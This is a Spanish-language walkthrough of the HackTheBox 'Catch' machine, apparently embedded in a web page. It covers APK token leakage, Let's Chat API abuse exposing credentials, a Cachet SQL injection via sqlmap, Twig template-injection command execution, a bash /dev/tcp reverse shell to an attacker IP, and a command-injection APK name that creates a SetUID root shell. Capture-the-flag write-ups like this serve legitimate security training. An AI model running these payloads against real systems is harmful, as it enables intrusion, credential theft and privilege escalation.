@@ -70,6 +70,669 @@
         const markdownContent = `
 # Máquina "Catch" de HackTheBox
 
+Caracteristicas:
+
+- Linux  
+- Android
+- Media  
+- APK Analysis (apktool, d2j-dex2jar) JD-GUI 
+- Code Inspection Information Leakage 
+- Visible Token values Cachet Framework Exploitation 
+- SQLI Let's Chat Exploitation 
+- Abusing API (Reading Private Messages) Cachet Framework Exploitation 
+- Server Side Template Injection (SSTI) [RCE] Abusing Cron Job [Privilege Escalation]
+- Medium
+- Redis
+- Public Vulnerabilities
+- Enumeration
+- Lateral Movement
+- Apache
+- SSH
+- External
+- Use Of Injection Attacks
+- OpenSSH
+- Penetration Tester Level 2
+
+Util en:
+
+- eWPT
+- eWPTXv2
+- OSWE
+- Mobile
+
+
+        IP 10.10.11.150
+        
+haremos un escaneo exaustivo y rapido sin precaucion.
+
+- nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.150 -oG allPorts
+
+
+<pre>
+<code>
+    PORT     STATE SERVICE
+    22/tcp   open  ssh
+    80/tcp   open  http
+    3000/tcp open  ppp
+    5000/tcp open  upnp
+    8000/tcp open  http-alt
+</code>
+</pre>
+
+- nmap -p 22,80,3000,5000,8000 -sCV 10.10.11.150 -oG targeted
+
+<pre>
+<code>
+        PORT     STATE SERVICE VERSION
+    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+    80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+    |_http-server-header: Apache/2.4.41 (Ubuntu)
+    |_http-title: Catch Global Systems
+    3000/tcp open  ppp?
+    | fingerprint-strings:
+    |   GenericLines, Help, RTSPRequest:
+    |     HTTP/1.1 400 Bad Request
+    |     Content-Type: text/plain; charset=utf-8
+    |     Connection: close                                                        
+    |     Request
+    |   GetRequest:
+    |     HTTP/1.0 200 OK
+    |     Content-Type: text/html; charset=UTF-8
+    |     Set-Cookie: i_like_gitea=11f4bcc216e281a0; Path=/; HttpOnly
+    |     Set-Cookie: _csrf=TqeCOMxg0eXNRMeRtlBTI5MB66E6MTY1NDk4MDE5NDk5MzE4MjQ4Mw;
+    ...[snip]...
+    5000/tcp open  upnp?
+    | fingerprint-strings:
+    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge:                                                       
+    |     HTTP/1.1 400 Bad Request
+    |     Connection: close
+    |   GetRequest:
+    |     HTTP/1.1 302 Found
+    |     X-Frame-Options: SAMEORIGIN
+    |     X-Download-Options: noopen
+    ...[snip]...
+    8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+    |_http-server-header: Apache/2.4.29 (Ubuntu)
+    |_http-title: Catch Global Systems
+    2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+    ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+    SF-Port3000-TCP:V=7.80%I=7%D=6/11%Time=62A4FE5E%P=x86_64-pc-linux-gnu%r(Ge 
+    ...[snip]...
+    SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(Help,2F,"H
+    SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 94.91 seconds
+</code>
+</pre>
+
+hacemos whatweb y lanzamos los 3 puertos mas altos que hay
+
+<pre>
+<code>
+
+- whatweb 10.10.11.150:5000
+[http://10.10.11.150:5000](http://10.10.11.150:5000/ "http://10.10.11.150:5000") [302 Found] Content-Security-Policy, Cookies[connect.sid], Country[RESERVED][ZZ], HttpOnly[connect.sid], IP[[10.10.11.150](http://10.10.11.150/ "http://10.10.11.150")], RedirectLocation[/login], UncommonHeaders[x-download-options,x-content-type-options,content-security-policy,x-content-security-policy,x-webkit-csp], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=Edge,chrome=1], X-XSS-Protection[1; mode=block]  
+[http://10.10.11.150:5000/login](http://10.10.11.150:5000/login "http://10.10.11.150:5000/login") [200 OK] Content-Security-Policy, Cookies[connect.sid], Country[RESERVED][ZZ], HTML5, HttpOnly[connect.sid], IP[[10.10.11.150](http://10.10.11.150/ "http://10.10.11.150")], PasswordField[password], Script, Title[Login &middot; Let's Chat], UncommonHeaders[x-download-options,x-content-type-options,content-security-policy,x-content-security-policy,x-webkit-csp], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=Edge,chrome=1], X-XSS-Protection[1; mode=block]09:31
+
+- whatweb 10.10.11.150:8000
+[http://10.10.11.150:5000](http://10.10.11.150:5000/ "http://10.10.11.150:5000") [302 Found] Content-Security-Policy, Cookies[connect.sid], Country[RESERVED][ZZ], HttpOnly[connect.sid], IP[[10.10.11.150](http://10.10.11.150/ "http://10.10.11.150")], RedirectLocation[/login], UncommonHeaders[x-download-options,x-content-type-options,content-security-policy,x-content-security-policy,x-webkit-csp], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=Edge,chrome=1], X-XSS-Protection[1; mode=block]  
+[http://10.10.11.150:5000/login](http://10.10.11.150:5000/login "http://10.10.11.150:5000/login") [200 OK] Content-Security-Policy, Cookies[connect.sid], Country[RESERVED][ZZ], HTML5, HttpOnly[connect.sid], IP[[10.10.11.150](http://10.10.11.150/ "http://10.10.11.150")], PasswordField[password], Script, Title[Login &middot; Let's Chat], UncommonHeaders[x-download-options,x-content-type-options,content-security-policy,x-content-security-policy,x-webkit-csp], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=Edge,chrome=1], X-XSS-Protection[1; mode=block]09:31
+
+- whatweb 10.10.11.150:3000
+http://10.10.11.150:5000 [302 Found] Content-Security-Policy, Cookies[connect.sid], Country[RESERVED][ZZ], HttpOnly[connect.sid], IP[10.10.11.150], RedirectLocation[/login], UncommonHeaders[x-download-options,x-content-type-options,content-security-policy,x-content-security-policy,x-webkit-csp], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=Edge,chrome=1], X-XSS-Protection[1; mode=block]
+http://10.10.11.150:5000/login [200 OK] Content-Security-Policy, Cookies[connect.sid], Country[RESERVED][ZZ], HTML5, HttpOnly[connect.sid], IP[10.10.11.150], PasswordField[password], Script, Title[Login &middot; Let's Chat], UncommonHeaders[x-download-options,x-content-type-options,content-security-policy,x-content-security-policy,x-webkit-csp], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=Edge,chrome=1], X-XSS-Protection[1; mode=block]
+
+</code>
+</pre>
+
+vemos algunas caracteristicas utiles. 
+Ahora lanzaremos el nmap con scrips y servicios, entonces vemos que en el puerto 22 esta corriendo una version de ssh.
+
+- 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+
+buscamos el launchpad y es
+
+- ubuntu focal
+
+buscamos el  servicio del puerto 80 
+
+- 80/tcp open http Apache httpd 2.4.41 
+
+y nos da una salida distinta significa que podemos estar frente a contenedores. Una vez analizada la estructura revisaremos la pagina alojada en el puerto 80
+
+<img src="imagenes/catch/web1.webp" alt="Texto alternativo" width="500">
+
+Ninguno de los enlaces de la página conduce a ninguna parte, excepto el botón "Descargar ahora", que descarga catchv1.0.apk. 
+podriamos usar anbox para analizarla pero es una aplicacion mucho mas simple asi que solo usaremos apktool
+
+- sudo apt install android-apktool
+
+una vez instalado 
+
+- apktool -d catchv1.0.apk
+
+esto descomprimira la apk, entramos y veremos algunos archivos tales como, AndroidManifest.xml, apktool.yml pero hay un archivo donde podemos encontrar
+cosas interesantes que esta en /res/values/strings.xml. Por ejemplo aplicaciones que cuenten con firebase, hay veces que se ve la url de firebase
+y a partir de ahi probar /json
+
+ahora haremos un
+
+- cat res/values/strings.xml | grep token
+
+nos devolvera 3 tokens 
+
+<pre>
+<code>
+
+1 = < string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string >
+2 = < string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ== </string >
+3 = < string name="slack_token">xoxp-23984754863-2348975623103</string >
+
+</code>
+</pre>
+
+las guardaremos en un archivo
+
+- cat res/values/strings.xml | grep token | sed 's/^ *// ' > ../token
+
+en donde  sed 's/^ *// '  borrara el espacio del comienzo de la linea, estos tokens los guardaremos en caso de que en las secciones de la pagina 
+alguno de los servidores web se puedan reutilizar, que es lo que hariamos ahora.
+
+buscaremos dentro de la apk reverseada algo relacionado con la pagina web tipo
+
+- grep -r -i "10.10.11.150"
+- grep -r -i "catch"
+
+y nos da una nueva direccion que es status.catch.htb asi que nos horramos la fuerza bruta y ya sabemos que este subdominio existe
+por logica podemos determinar, que como tiene virtual hosting tenemos una forma de bruteforcear para descubrir subdominios (hosts)
+de que otra manera podriamos haberlo visto, si no hubiesemos llegado a esta parte ?
+algo que podiamos haber echo, es que como dentro de la apk sin decompilar hay un archivo .dex
+podriamos usar la herramienta d2j-dex2jar que permite reversear mediante herramientas como jd-gui para ver todo el codigo fuente de la aplicacion
+es un descompilador para el lenguaje de programacion java, se proporciona como una herramienta gui asi como complemento para los entornos desarrollo 
+integrados como eclipse o intellij Idea. Continuamos a instalar dex2jar
+
+- sudo apt install dex2jar
+
+luego hacemos 
+
+- d2j-dex2jar aplicacion.apk
+
+y esto se encargara de crear un archivo .jar a travez del cual con jd-gui, podremos revisarlo.
+abrimos file y podremos ver nuestro archivo .jar, ahora podremos inspeccionar el codigo de mejor manera, como esta compuesta
+Podemos ver que aparece la direccion status.catch.htb asi que lo agregamos al etc host, asi como catch.htb
+
+asi que una ves echo esto ya deberia reconocer los puertos que habiamos escaneado anteriormente, como lo eran el 3000 5000 y 8000
+
+<img src="imagenes/catch/web1.png" alt="Texto alternativo" width="500">
+
+- 10.10.11.150:5000
+
+<img src="imagenes/catch/letchat1.webp" alt="Texto alternativo" width="500">
+
+- 10.10.11.150:8000
+
+<img src="imagenes/catch/past1.png" alt="Texto alternativo" width="500">
+
+los host alojados catch.htb y estatus.catch.htb y nos lleva a la misma pagina, pero recordar que en el host status nos marcaba como https
+luego hacemos un testeo del puerto 5000 y nos lleva a una pagina llamada lets chat quitamos la seccion login del comienzo y nos devuelve el login al cargar
+mas abajo se puede ver la seccion code on github, asi que puede estar el repositorio en github, Lo buscamos.
+
+- https://github.com/sdelements/lets-chat
+
+Aplicación de chat auto hospedada para equipos pequeños, iremos a la wiki y le hecharemos un ojo, entraremos a la seccion api rooms
+asi que probaremos con los ejemplos de la api y lanzaremos una peticion por GET a cierta direccion url
+
+<img src="imagenes/catch/letschat2.jpg" alt="Texto alternativo" width="500">
+
+- curl -s -X GET  "http://10.10.11.150:5000/rooms"
+
+y nos devuelve unauthorized. si recordamos anteriormente guardamos unos tokens que rescatamos desde la apk usaremos el token de lets chats  
+asi que suponemos que esta es la tipica consulta donde arrastra el authorization bearer que ya hemos visto anteriormente en otras maquinas asi que lo hacemos 
+
+- curl -s -X GET "[http://10.10.11.150:5000/rooms](http://10.10.11.150:5000/rooms "http://10.10.11.150:5000/rooms")" -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="
+
+y nos devuelve una salida valida.
+
+<img src="imagenes/catch/savesi2.jpg" alt="Texto alternativo" width="500">
+
+se ve que podemos obtener info
+lo parseamos con otra salida.
+
+- curl -s -X GET "[http://10.10.11.150:5000/rooms](http://10.10.11.150:5000/rooms "http://10.10.11.150:5000/rooms")" -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | jq
+
+y tenemos
+
+<img src="imagenes/catch/salida3.jpg" alt="Texto alternativo" width="500">
+
+como se podia ver en github
+el orden era 
+
+- /rooms/:roomsid/users
+
+pero en lugar de poner users pondremos messages, y nos dara una salida valida de mensajes
+
+<img src="imagenes/catch/salida4.jpg" alt="Texto alternativo" width="500">
+
+con esto podremos ver las conversaciones que realizaron los usuarios, filtraremos para ver que dice.
+
+- curl -s -X GET "[http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages](http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages "http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages")" -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ= =" | jq '.[].text' 
+
+- jq '.[].text' = esta seccion mostrara solo el texto de la salida en formato jq
+
+y en la salida vemos:
+ 
+
+<pre>
+<code>
+ "ah sure!"  
+ "You should actually include this task to your list as well as a part of quarterly audit"  
+ "Also make sure we've our systems, applications and databases up-to-date."  
+ "Excellent! "  
+ "Why not. We've this in our todo list for next quarter"  
+ "@john is it possible to add SSL to our status domain to make sure everything is secure ? "  
+ "Here are the credentials john : E}WV!mywu_69T4C}"  
+ "Sure one sec."  
+ "Can you create an account for me ? "  
+ "Hey Team! I'll be handling the  status.catch.htb from now on. Lemme know if you need anything from me. "
+</code>
+</pre>
+
+y se pueden ver unas credenciales en texto claro:
+
+- john : E}WV!mywu_69T4C}
+
+nos intentaremos conectar por ssh por los tres servicios y funciono en el que corre por el puerto 8000 que es dashboard.
+luego de analizar, en la sección config podemos ver la versión de la aplicacion catch, que es la 2.4.0-dev
+buscamos vuln o exploit de la version y nos damos cuenta de que explotan mucho sqli, asi que buscamos en google 
+y encontramos.
+
+- https://twitter.com/therceman/status/1432929600141725697
+- https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html 
+
+asique bueno vemos el write up y vemos que necesitaremos usar sqlmap, copiamos la linea a explotar
+que desarrollo nuestro chino favorito.
+
+- /api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+"
+
+<img src="imagenes/catch/salida5.png" alt="Texto alternativo" width="500">
+
+opiaremos la linea completa del navegador, mas la herramienta sqlmap quedaria.
+
+- sqlmap -u "[http://10.10.11.150:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+%22" --dbs --batch
+
+- dbs para enumerar la base de datos
+
+para identificar una vulnerabilidad de tipo SSTI (Server side template injection) solamente debemos comprobar
+que interpreta la cadena que le inyectamos.
+
+y nos a como salida:
+
+<pre>
+<code>
+    sys available databases [5]:  
+
+    [*] cachet  
+    [*] information_schema  
+    [*] mysql  
+    [*] performance_schema  
+    [*] sys  
+</code>
+</pre>
+
+HTTP error codes detected during run:  
+401 (Unauthorized) - 1 times, 500 (Internal Server Error) - 76 times  
+
+[02:52:22] [INFO] fetched data logged to text files under '/home/kar/.local/share/sqlmap/output/10.10.11.150'
+
+asi que una vez echo esto modificamos la consulta sql con los datos rescatados.
+
+- sqlmap -u "[http://10.10.11.150:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+%22" -D cachet -T users -C api key, username --dump --batch
+
+donde -D es database 
+
+-T es tabla
+
+-C es column 
+
+--dump para dumpear la data
+
+--batch es dar si a todo
+
+repasando lo visto, no tenemos que ser admin para ejecutar la parte del SSTI si nos fijamos en la parte de incident template.
+necesitamos el api key, lo necesitamo por que en la parte de incidents templates podemos crear nuestro propio incident 
+en name debe ser algo que recordemos por lo que despues debemos identificarlo.
+
+dice  que añade las llaves tipicas del ssti 233 * 233, la idea es que atraves de la api enumeremos la respuesta enviando una peticion por post a la ruta 
+incident de la api que seria /api/v1/incidents, donde a nivel de data tendriamos que tramitar 
+
+- visible=0&status=1&name=demo&template=ssti
+
+la consulta quedaria asi.
+
+- curl -S -X POST "http://10.10.11.150:8000/api/v1/incidents" -d "visible=0&status=1&name=demo&template=ssti" | jq
+
+pero nos dara error ya que debemos obtener el x-cache token que esta almacenado en la base de datos
+
+<img src="imagenes/catch/save3.png" alt="Texto alternativo" width="500">
+
+y con ese token ya podremos tramitar la consulta. La consulta quedaria de la siguiente manera:
+
+- curl -S -X POST -H "X-Cachet-Token: 7GVCqTY5abrox4" "http://10.10.11.150:8000/api/v1/incidents" -d "visible=0&status=1&name=demo&template=ssti" | jq
+
+y nos da como salida
+
+<img src="imagenes/catch/save4.png" alt="Texto alternativo" width="500">
+
+y nos dara como salida 
+
+<img src="imagenes/catch/save4.png" alt="Texto alternativo" width="500">
+
+con esa salida podemos ver que a ejecutado el codigo, asi que vemos la pagina inspeccion de codigo y en la seccion network vemos los 
+headers y no se ve la cookie para la api, se necesita algo mas que no se esta arrastrando entonces, tenemos que tirar por sqlinyection
+bueno tenemos ssti y podemos ver la salida del codigo, ahora como acontecemos el rse, es de la siguiente manera.
+
+- {{["id"]|filter("system")|join(",")}}  
+- {{["id"]|map("system")|join(",")}}
+
+y nos da como salida:
+
+<img src="imagenes/catch/save6.png" alt="Texto alternativo" width="500">
+
+la salida message nos muestra que tenemos capacidad de ejecucion remota de comandos, ahora ganaremos acceso. 
+nos pondremos en escucha por el puerto 443:
+
+- nc -nlvp 443
+
+y mandamos una consulta que nos envie una revshell 
+
+- {{["bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'"]|filter("system")|join(",")}}  
+
+y listo nos da acceso hacemos whoami y somo www-data luego hostname da un especie de id tipo:
+
+- whoami
+- q8eh27eh8qhf 
+
+con esto concluimos que es un contenedor
+
+- hostname -i
+- 172.17.0.15
+
+
+al parecer tendremos que escapar del contenedor y como anteriormente hemos visto en metodo de los docker.sock
+o archivos sockets que nos permiten escapar inyectando atraves de un abuso de la api, crear un contenedor etc
+existen vias potenciales para escalar a la maquina victima.
+
+configuramos la shell
+
+- script /dev/null -c bash
+- ctrl + z
+- stty raw -echo: fg
+- reset xterm
+- export TERM=xterm
+- export SHELL=bash
+
+buscamos la flag
+
+- find \-name user.txt 2>/dev/null
+
+revisando vulnerabilidades vistas habia una que nos explicaba code execution via laravel
+
+- https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/
+
+aqui nos explican como despues de explotar el servicio dentro del contenedor podemos ver los archivos .env
+que se pueden ver atraves de configuration leaks, asi que lo haremos.
+
+- find \-name .env 2>/dev/null
+
+<img src="imagenes/catch/save7.png" alt="Texto alternativo" width="500">
+
+es el primero y ya podemos ver un usuario y una contraseña, hacemos cat /etc/os.release nos muestra un ubunto bionic 
+recordar que estamos en el puerto 8000 y el ubuntu focal estaba en el 22, intentaremos conectar por ssh con las credenciales 
+que encontramos en el .env.
+
+- ssh will@10.10.11.150
+
+y tenemos flag de user. Repasando un poco lo anterior vemos que la maquina aplico port forwarding para exponer el puerto del docker
+revisamos los logs de ssh.
+
+- cat /var/log/auth.log
+
+podremos borrar la entrada solo como root, revisamos privilegios.
+
+- sudo -l
+
+no tenemos privilegios sudoers asi que buscaremos archivos suid cuyo propietarios sean root y podamos hacer algo
+
+- find \-perm -4000 -users root 2>/dev/null
+
+vemos algunos y no tenemos ninguno que se pueda abusar, asi que ahora listaremos las capabilities en el sistema de forma recursiva.
+
+- getcap -r / 2>/dev/null
+
+nada
+
+- uname -a
+
+nada a nivel de kernel
+
+- will@catch:/opt$ ls
+
+- containerd  mdm
+
+Hay un montón de procesos docker-proxy revisando producción lanzamos 
+
+- ps auxww
+
+<pre>
+<code>
+root        1403  0.0  0.0 548252   668 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6000 -container-ip 172.17.0.2 -container-port 80
+root        1565  0.0  0.0 400788   484 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6001 -container-ip 172.17.0.3 -container-port 80
+root        1787  0.0  0.0 548252   472 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6002 -container-ip 172.17.0.4 -container-port 80
+root        2715  0.0  0.0 400788   448 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6003 -container-ip 172.17.0.5 -container-port 80
+root        3344  0.0  0.0 400788   504 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6004 -container-ip 172.17.0.6 -container-port 80
+root        3828  0.0  0.0 548252   376 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6005 -container-ip 172.17.0.7 -container-port 80
+root        4551  0.0  0.0 548252   400 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6006 -container-ip 172.17.0.8 -container-port 80
+root        4899  0.0  0.0 400788   496 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6007 -container-ip 172.17.0.9 -container-port 80
+root        5585  0.0  0.0 548252   484 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6008 -container-ip 172.17.0.10 -container-port 80
+root        6438  0.0  0.0 474520   408 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6009 -container-ip 172.17.0.11 -container-port 80
+root        6989  0.0  0.0 400788   404 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6010 -container-ip 172.17.0.12 -container-port 80
+root        7544  0.0  0.0 474520   496 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6011 -container-ip 172.17.0.13 -container-port 80
+root        8026  0.0  0.0 474520   404 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6012 -container-ip 172.17.0.14 -container-port 80
+root        8779  0.0  0.0 474520   872 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6013 -container-ip 172.17.0.15 -container-port 80
+root        9105  0.0  0.0 400788   824 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6014 -container-ip 172.17.0.16 -container-port 80
+root        9844  0.0  0.0 548252  1392 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6015 -container-ip 172.17.0.17 -container-port 80
+</code>
+</pre>
+
+Probablemente se trate de contenedores utilizados para equilibrar la carga del paso Cachet, de modo que más jugadores puedan resolver el problema. 
+.env. No puedo acceder a la carpeta containerd.
+mdm es más interesante. Tiene un script de shell y una carpeta vacía: 
+
+- will@catch:/opt/mdm$ ls
+- apk_bin  verify.sh
+
+Procesos
+
+Para ver los procesos en ejecución, subiré pspy usando scp: 
+
+- sshpass -p 's2#4Fg0_%3!' scp /opt/pspy/pspy64 will@10.10.11.150:/dev/shm/
+
+Al ejecutarlo, notaré que verify.sh se ejecuta como root cada minuto: 
+
+- 2022/06/29 19:25:01 CMD: UID=0    PID=1000440 | /bin/bash /opt/mdm/verify.sh 
+
+analizando verify.sh podemos ver la estructura general del archivo que consiste en definir cuatro funciones y luego tener un bucle que las llama: 
+
+
+<pre>
+<code>
+#!/bin/bash
+
+###################
+# Signature Check #
+###################    
+                                                 
+sig_check() {
+...[snip]]]
+}
+
+#######################
+# Compatibility Check #
+#######################
+                                                 
+comp_check() {     
+...[snip]...
+}  
+
+####################
+# Basic App Checks #
+####################
+                                                 
+app_check() {        
+...[snip]...
+}
+
+###########
+# Cleanup #
+###########
+
+cleanup() {
+        rm -rf $PROCESS_BIN;rm -rf "$DROPBOX/*" "$IN_FOLDER/*";rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh)
+}
+
+
+###################
+# MDM CheckerV1.0 #
+###################
+
+DROPBOX=/opt/mdm/apk_bin
+IN_FOLDER=/root/mdm/apk_bin
+OUT_FOLDER=/root/mdm/certified_apps
+PROCESS_BIN=/root/mdm/process_bin
+
+for IN_APK_NAME in $DROPBOX/*.apk;do
+        OUT_APK_NAME="$(echo $ {IN_APK_NAME##*/} | cut -d '.' -f1)_verified.apk"
+        APK_NAME="$(openssl rand -hex 12).apk"
+        if [[ -L "$IN_APK_NAME" ]]; then
+                exit
+        else
+                mv "$IN_APK_NAME" "$IN_FOLDER/$APK_NAME"
+        fi
+        sig_check $IN_FOLDER $APK_NAME
+        comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN
+        app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME
+done
+cleanup
+</code>
+</pre>
+
+Está recorriendo todos los archivos .apk en /opt/mdm/apk_bin. Generando un nombre de archivo de salida para cada uno, eliminando todo lo anterior 
+al último /(usando var##word ), dividiendo en ., y luego agregando _verified.apk hasta el final. 
+Comprueba si el archivo es un enlace simbólico, de ser así, sale. De lo contrario, mueve el APK a una carpeta en /root.
+
+Entonces llama sig_check, comp_check, y app_check. Una vez que se completa el ciclo, llama cleanup. 
+El app_checkLa función tiene una vulnerabilidad de inyección de comando
+
+<pre>
+<code>
+ app_check() {                                    
+        APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml") 
+        echo $APP_NAME
+        if [[ $APP_NAME == *"Catch"* ]]; then
+                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
+                mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
+        else
+                echo "[!] App doesn't belong to Catch Global"
+                cleanup                      
+                exit
+        fi
+}  
+</code>
+</pre>
+
+Usa greppara sacar el nombre de strings.xml, y luego, si "Catch" está presente en el nombre, crea un directorio y mueve el apk a él.
+Para ordenar la inyección, solo necesitaré configurar el nombre en algo con un subshell ( $()), y eso será ejecutado
+
+asi que bueno editaremos la apk usaré apktool para descompilar el APK en sus fuentes, como se describe en https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82
+descargamos la ultima version https://github.com/iBotPeaches/Apktool/releases/tag/v2.6.1 
+
+Debido a que este APK no se ejecutará en un dispositivo, no tengo que preocuparme por firmarlo.
+
+Empezaré por descompilar la aplicación:
+
+- java -jar apktool_2.6.1.jar d catchv1.0.apk -o decomp
+
+<pre>
+<code>
+I: Using Apktool 2.6.1 on catchv1.0.apk
+I: Loading resource table...
+I: Decoding AndroidManifest.xml with resources...
+I: Loading resource table from file: /home/oxdf/.local/share/apktool/framework/1.apk
+I: Regular manifest package...
+I: Decoding file-resources...
+I: Decoding values */* XMLs...
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Copying original files...
+</code>
+</pre>
+
+
+Verificaré que puedo reconstruirlo sin cambios, solo para asegurarme de que mi sistema esté funcionando: 
+
+- java -jar apktool_2.6.1.jar b -f decomp/ -o test.apk
+
+<pre>
+<code>
+I: Using Apktool 2.6.1
+I: Smaling smali folder into classes.dex...
+I: Building resources...
+I: Building apk file...
+I: Copying unknown files/dir...
+I: Built apk...
+</code>
+</pre>
+
+- rm test.apk
+
+En un momento recibí errores que se parecían a este problema y se solucionaron ejecutando apktool empty-framework-dir --forcecomo se sugiere allí.
+
+abriré decomp/res/values/strings.xml y editare el app_name: 
+
+- <string name="app_name">Catch$(cp /bin/bash /tmp/test; chmod 4777 /tmp/test)</string>
+
+Esto copiará bash en /tmp y lo conviérta en SetUID para ejecutarse como root.
+
+Vuelva a construirlo: 
+
+- java -jar apktool_2.6.1.jar b -f decomp/ -o modified.apk
+
+<pre>
+<code>
+I: Using Apktool 2.6.1
+I: Smaling smali folder into classes.dex...
+I: Building resources...
+I: Building apk file...
+I: Copying unknown files/dir...
+I: Built apk...
+</code>
+</pre>
+
+Subiré esto a Catch usando scp, directamente en el directorio de Dropbox: 
+
+- sshpass -p 's2#4Fg0_%3!' scp modified.apk will@10.10.11.150:/opt/mdm/apk_bin/
+
+Una vez que pasa un minuto, lo comprobaré y hay un archivo SetUID test en /tmp: 
+Ejecutándolo (con -p para no soltar privs) da un shell con euid de raíz: 
+
+    will@catch:/opt/mdm$ /tmp/test -p
+    test-5.0# id
+    uid=1000(will) gid=1000(will) euid=0(root) groups=1000(will)
+
+y con esto es suficiente para tener la flag de root.
+
+
 
         `;
         
